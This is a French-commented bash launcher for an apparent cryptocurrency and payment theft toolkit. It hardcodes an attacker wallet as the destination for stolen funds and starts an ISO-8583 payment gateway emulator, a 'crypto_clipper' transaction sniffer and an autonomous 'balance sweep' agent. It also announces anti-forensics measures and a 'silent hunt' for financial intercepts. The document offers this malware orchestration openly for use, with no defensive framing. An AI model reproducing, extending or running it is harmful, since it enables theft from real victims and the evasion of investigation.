#!/bin/bash
# ================================================================
# SOVEREIGN-CORE v7.1 - OPERATIONAL LAUNCHER (FARDC GRADE)
# Mission: Fin-Strike & Dual-Force Hégémonie
# ================================================================

VAULT="TTGUNrYEY4FGLAJ3qN8tWT2vkFAwfQjh14"

echo "----------------------------------------------------------------"
echo "👑 SOVEREIGN-CORE : INITIALISATION DE LA MISSION"
echo "----------------------------------------------------------------"

# 1. Activation des protections de bas niveau
echo "[🛡️] ACTIVATION : Anti-Dump & Anti-Forensics..."
# (Le noyau compilé gère cela au runtime)

# 2. Lancement de la Passerelle Gateway (Back-end)
echo "[🏛️] LANCEMENT : Sovereign Gateway (ISO-8583 Emulation)..."
java -cp "build/classes:libs/*" com.fardc.sigint.core.MissionOrchestrator      --enable-gateway      --vault "$VAULT"      --mode "DUAL-FORCE" &
SLEEP_PID=$!

# 3. Activation du scanner de proximité (Front-end)
echo "[📡] ACTIVATION : SIGINT & Sniffer de transactions..."
python3 Sovereign-Offensive/vectors/financial/crypto_clipper.py &

# 4. Armement du module de vidange autonome (Agent)
echo "[⚡] ARMEMENT : Dual-Force Balance Sweep..."
python3 core/Infiltration/Agent_Tools/DualForce.py &

echo "----------------------------------------------------------------"
echo "[✅] SYSTÈME OPÉRATIONNEL : Chasse silencieuse en cours..."
echo "[🛰️] TOUTES LES CAPTURES SONT DIRIGÉES VERS : $VAULT"
echo "----------------------------------------------------------------"

# Garde le script actif pour monitorer les logs
tail -f core/logs/financial_intercepts.log 2>/dev/null || wait $SLEEP_PID
